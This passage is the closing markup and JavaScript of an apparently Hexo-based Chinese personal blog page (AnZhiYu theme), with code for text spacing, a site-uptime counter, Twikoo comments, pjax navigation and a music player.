    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("2023/10/18 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "https://img.shields.io/badge/L1ulee%E3%81%AE%E4%B8%87%E4%BA%8B%E5%B1%8B-%E4%BC%91%E5%85%BB%E7%94%9F%E6%81%AF-white?style=social&amp;logo=Gin&amp;logoColor=000000";
        img.title = "下班了就该开开心心的玩耍，嘿嘿~";
        img.alt = "下班了就该开开心心的玩耍，嘿嘿~";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://comment.2sec.io',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.39/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://comment.2sec.io',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://comment.2sec.io',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.39/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>